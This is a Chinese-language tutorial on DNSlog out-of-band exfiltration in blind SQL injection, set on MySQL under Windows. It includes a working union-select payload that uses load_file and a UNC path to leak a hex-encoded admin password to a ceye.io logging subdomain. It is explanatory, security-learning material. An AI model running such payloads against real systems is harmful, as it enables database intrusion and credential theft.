## 关于DNSlog在Web攻击的利用

简单理解就是在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起DNS请求，这个时候可以通过DNSlog这种方式把想获得的数据外带出来。

## 常用在哪些情况下

  1. SQL注入中的盲注

  2. 无回显的命令执行

  3. 无回显的SSRF

## DNSlog攻击的基本原理

![dnllog原理图](https://image.3001.net/images/20210224/1614164845_6036336de4817f724b780.jpg!small)

 **作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS日志，就得到了想要的值。**
所以我们需要有一个自己的域名，然后再域名商处配置一条NS记录，然后我们在NS服务器上获取DNS日志即可。

## DNSLOG在MySQL数据库中SQL注入的实战

本次演示一个最常见的注入场景，就是WHERE后面条件处的注入。实验环境有一个test_user表，三个字段id、user、pass。如下

id| user| pass  
---|---|---  
1| admin| admin123  
  
最后就不再自己搭建一个DNS服务器了，直接用ceye.io这个平台，这个平台就集成了Dnslog的功能。

### 需要条件

  1. MySQL开启`load_file()`

  2. DNSLog平台（[hyuga](http://hyuga.co/)、[CEYE](http://ceye.io/)）

  3. Windows平台

### Mysql服务端文件读写

条件： **服务端配置可读写目录和正确的用户权限。**

#### 安全保护

mysql服务端的文件读取有很多的条件限制，主要是mysql数据库的配置，为了安全原因，当读取位于服务器上的文本文件时，文件必须处于数据库目录可被所有人读取。你可以通过执行`show
variables like '%secure%'`来查看。

`secure-file-priv`参数是用来限制`LOAD DATA`,`SELECT ...
OUTFILE`,`DUMPFILE`和`LOAD_FILE()`可以操作的文件夹。

`secure-file-priv`的值可以分为三种情况：

  1. `secure-file-priv`的值为null，表示显示mysqld不允许导入|导出

  2. `secure-file-priv`的值为`/tmp/`，表示限制mysqld的导入|导出只能发生在`/tmp/`目录下，此时如果读写发生在其他文件夹中，就会报错

  3. 当`secure-file-priv`的值没有具体值，表示不对`mysqld`的导入|导出做限制。

除此之外，读取或写入文件必须拥有可操作的用户权限否则会报错。

`ERROR 1045 (28000): Access denied for user`

读取文件

    
    
    SELECT LOAD_FILE('/var/lib/mysql-files/aaa') AS Result;
    
    
    create database test;  
    create table test (id TEXT, content TEXT);  
    load data infile "/var/lib/mysql-files/aaa" into table test.test FIELDS TERMINATED BY '\n\r';

写入文件

    
    
    select group_concat(id) from test INTO DUMPFILE "/var/lib/mysql-files/aaaaa";

  

### load_file

MySQL应该是在实战中利用DNSLOG最多的。

在MySQL中，有一个`load_file`函数可以用来读取本地的文件。

`http://127.0.0.1/mysql.php?id=1 union select
1,2,load_file(concat('\\\\',(SELECT hex(pass) FROM test.test_user WHERE
user='admin' LIMIT 1),'.mysql.nk40ci.ceye.io\\abc'))`

可以看到test_user中的pass字段的值的Hex码就被查询出来了，为什么这个地方
**Hex编码的目的就是减少干扰，因为很多时候数据库字段的值可能是有特殊符号的，这些特殊符号拼接在域名里是无法做DNS查询的，因为域名有一定的规范，有些特殊符号是不能带入的。**

 **注意：`load_file`函数再Linux下是无法用来做DNSLOG攻击的，因为这里就涉及到Windows的UNC路径。**

#### UNC路径

百度的UNC路径的解释

UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器.
UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。

其实我们平常在Windows中用共享文件的时候就会用到这种网络地址的形式

`\\sss.xxx\test\`

这也就解释了为什么CONCAT()函数拼接了4个`\`了，因为转义的原因，4个`\`就变成了2个`\`，目的就是利用UNC路径。

因为Linux没有UNC路径这个东西，所以当MySQL处理Linux系统中的时候，是不能用这种方式外带数据的。

### 总结

  1.  **有些函数的使用受操作系统的限制**

  2.  **DNS查询有长度限制，所以必要的时候需要对查询结果做字符串的切割**

  3.  **避免一些特殊符号的产生，最好的选择就是数据先编码再带出**

  4. 注意不同的数据库的语法是有差异的，特别是在数据库拼接的时候

  5. 有些操作是需要较高权限的

参考文献：

[Dnslog在SQL注入中的实战](https://www.anquanke.com/post/id/98096#h2-8)

[DNSLog 数据外带](https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-71)

